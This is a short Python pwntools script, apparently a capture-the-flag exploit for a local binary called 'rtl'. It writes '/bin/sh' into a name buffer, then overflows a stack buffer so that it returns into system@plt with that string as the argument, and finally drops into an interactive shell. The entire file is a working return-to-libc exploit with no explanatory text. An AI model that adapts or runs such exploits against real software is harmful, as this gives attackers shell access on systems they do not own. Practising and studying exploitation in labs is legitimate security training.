from pwn import *

system_plt = 0x08048380
name_addr =  0x0804a060


p = process("./rtl")

payload1 = "/bin/sh\00"+"a"*192

payload2 = "a"*104+p32(system_plt)+"a"*4+p32(name_addr)
p.send(payload1)
sleep(1)
p.send(payload2)

p.interactive()